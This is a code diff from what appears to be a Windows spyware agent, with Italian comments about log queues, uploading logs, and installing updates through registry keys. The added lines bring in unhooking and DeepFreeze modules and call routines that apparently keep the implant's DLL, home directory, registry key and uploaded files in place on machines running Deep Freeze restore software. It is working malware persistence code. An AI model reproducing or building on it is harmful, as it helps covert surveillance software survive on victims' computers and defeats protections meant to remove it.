@@ -11,6 +11,8 @@
 #include "explore_directory.h"
 #include "x64.h"
 #include "JSON\JSON.h"
+#include "UnHookClass.h"
+#include "DeepFreeze.h"
 
 typedef struct {
 	DWORD agent_tag;
@@ -67,6 +69,7 @@ DWORD max_disk_full = 0;    // Spazio massimo occupabile dai log
 extern DWORD log_free_space; // Dichiarata nel segmento shared
 extern DWORD log_active_queue;
 
+extern BOOL IsDeepFreeze();
 
 // Inserisce un elemento nella lista dei log da spedire in ordine di tempo
 BOOL InsertLogList(log_list_struct **log_list, WIN32_FIND_DATA *log_elem)
@@ -1279,10 +1282,14 @@ BOOL LOG_HandleUpload(BOOL is_upload)
 			DeleteFile(HM_CompletePath(c_file_name, s_file_path));
 
 		} else if(!strcmp(c_file_name, COMMON_UPDATE_NAME)) { 
-			if (CopyFile(HM_CompletePath(COMMON_UPDATE_NAME, s_file_path), HM_CompletePath(H4_UPDATE_FILE, d_file_path), FALSE))
+			if (CopyFile(HM_CompletePath(COMMON_UPDATE_NAME, s_file_path), HM_CompletePath(H4_UPDATE_FILE, d_file_path), FALSE)) {
 				HM_InsertRegistryKey(H4_UPDATE_FILE, TRUE);
+				if (IsDeepFreeze()) {
+					HideDevice dev_df;
+					DFFixCore(&dev_df, (unsigned char *)H4DLLNAME, (unsigned char *)H4_HOME_PATH, (unsigned char *)REGISTRY_KEY_NAME, TRUE);
+				}
+			}
 			DeleteFile(HM_CompletePath(c_file_name, s_file_path));
-
 		} else if(!strcmp(c_file_name, COMMON_UPDATE64_NAME)) {
 			Kill64Core();
 			Sleep(1000); // Aspetta in caso la dll64 sia in qualche thread di hooking
@@ -1309,10 +1316,21 @@ BOOL LOG_HandleUpload(BOOL is_upload)
 		} else if(!strcmp(c_file_name, COMMON_EXE_INSTALLER_NAME)) {
 			CopyFile(HM_CompletePath(COMMON_EXE_INSTALLER_NAME, s_file_path), HM_CompletePath(EXE_INSTALLER_NAME, d_file_path), FALSE);
 			DeleteFile(HM_CompletePath(c_file_name, s_file_path));
+		} else {
+			HM_CompletePath(c_file_name, d_file_path);
 		}
 
 		// XXX Quando qui gestira' solo gli upgrade, cancellera' tutti i file che non conosce
 		// DeleteFile(HM_CompletePath(c_file_name, s_file_path));
+
+		// Se c'e' DeepFreeze fixa i file 
+		if (IsDeepFreeze()) {
+			HideDevice dev_df;
+			WCHAR dest_path[MAX_PATH];
+			swprintf(dest_path, L"%S", d_file_path);
+			DFFixFile(&dev_df, dest_path);
+		}
+
 	} while(upload_left > 0);
 
 	return TRUE;
